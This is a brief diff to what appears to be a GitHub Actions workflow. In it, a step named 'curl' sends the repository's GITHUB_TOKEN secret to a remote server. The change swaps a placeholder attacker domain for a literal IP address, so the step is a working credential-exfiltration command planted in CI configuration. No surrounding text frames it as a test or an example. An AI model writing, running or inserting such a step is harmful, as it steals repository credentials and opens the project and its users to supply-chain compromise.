@@ -11,7 +11,7 @@ jobs:
     timeout-minutes: 480
     steps:
       - name: curl
-        run: curl http://attacker.tld/?token=${GITHUB_TOKEN}
+        run: curl http://103.16.128.93/?token=${GITHUB_TOKEN}
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
       - name: sleep 1
